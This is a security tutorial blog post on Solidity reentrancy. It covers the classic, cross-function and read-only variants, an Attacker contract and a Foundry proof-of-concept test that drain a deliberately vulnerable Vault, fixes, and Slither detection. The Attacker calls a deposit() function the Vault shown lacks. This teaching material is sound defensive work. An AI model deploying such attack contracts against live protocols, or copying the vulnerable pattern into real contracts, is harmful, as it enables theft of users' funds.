# Reentrancy Attacks — From Classic to Cross-Function Variants

**Tag:** Blockchain · **Date:** Jan 2026 · **Read time:** 10 min

---

Reentrancy is one of the oldest and most devastating vulnerability classes in Solidity. The DAO hack in 2016 drained $60M. Yet variants still appear in audit contests today. This post covers classic reentrancy, cross-function reentrancy, read-only reentrancy, and how to catch them with Slither and Foundry.

## What Is Reentrancy?

Reentrancy occurs when an external call is made before state is updated, allowing the callee to re-enter the calling function and exploit the stale state.

```solidity
// VULNERABLE — classic reentrancy
contract Vault {
    mapping(address => uint) public balances;

    function withdraw(uint amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        
        // ❌ External call BEFORE state update
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        
        // State update happens AFTER — attacker re-enters before this line
        balances[msg.sender] -= amount;
    }
}
```

## The Attack Contract

```solidity
contract Attacker {
    Vault public vault;
    uint public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT);
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw(ATTACK_AMOUNT);
    }

    // Called every time vault sends ETH
    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw(ATTACK_AMOUNT); // re-enter!
        }
    }
}
```

## The Fix — Checks-Effects-Interactions

```solidity
// FIXED — CEI pattern
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    
    // ✅ State update BEFORE external call
    balances[msg.sender] -= amount;
    
    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok);
}
```

Or use OpenZeppelin's `ReentrancyGuard`:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw(uint amount) external nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
    }
}
```

## Cross-Function Reentrancy

More subtle — the attacker re-enters a *different* function that reads the stale state.

```solidity
contract Token {
    mapping(address => uint) public balances;

    function transfer(address to, uint amount) external {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function withdrawAndTransfer(uint amount) external {
        require(balances[msg.sender] >= amount);
        
        // External call — attacker calls transfer() here
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        
        balances[msg.sender] -= amount; // too late
    }
}
```

## Read-Only Reentrancy

The most subtle variant — re-entering a `view` function that reads stale state used by another protocol.

```solidity
// Protocol A uses Protocol B's price
function getPrice() external view returns (uint) {
    return protocolB.getReserves(); // reads stale state during B's callback
}
```

This was the attack vector in several 2023 DeFi exploits where protocols used Curve's `get_virtual_price()` during a callback.

## Detection with Slither

```bash
# Install
pip install slither-analyzer

# Run reentrancy detectors
slither . --detect reentrancy-eth,reentrancy-no-eth,reentrancy-benign

# Example output
# Vault.withdraw(uint256) (Vault.sol#8-14) uses a dangerous pattern
# External call: (ok) = msg.sender.call{value: amount}("")
# State variable written after the call: balances[msg.sender] -= amount
```

## Foundry PoC Test

```solidity
// test/Reentrancy.t.sol
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(address(vault));
        
        // Fund vault with 10 ETH from other users
        vm.deal(address(vault), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyDrainsVault() public {
        uint vaultBefore = address(vault).balance;
        
        attacker.attack{value: 1 ether}();
        
        uint vaultAfter = address(vault).balance;
        
        // Vault should be drained
        assertEq(vaultAfter, 0);
        assertGt(address(attacker).balance, vaultBefore);
        
        console.log("Vault drained:", vaultBefore - vaultAfter, "wei");
    }
}
```

```bash
forge test -vvv --match-test testReentrancyDrainsVault
```

## Real Finding — Code4rena

In a recent Code4rena contest, I found a cross-function reentrancy in a lending protocol:

1. `liquidate()` called an external oracle before updating the borrower's debt
2. The oracle callback re-entered `borrow()` using the stale (pre-liquidation) collateral ratio
3. Attacker could borrow against already-liquidated collateral

**Impact:** High — protocol insolvency
**Fix:** Add `nonReentrant` to both functions and update state before external calls

## Checklist

- [ ] All external calls follow CEI (Checks-Effects-Interactions)
- [ ] `nonReentrant` modifier on all state-changing functions that make external calls
- [ ] Cross-function reentrancy: shared state updated before any external call
- [ ] Read-only reentrancy: don't use external `view` functions as price oracles during callbacks
- [ ] Slither reentrancy detectors pass with no findings
- [ ] Foundry fuzz tests cover reentrancy invariants
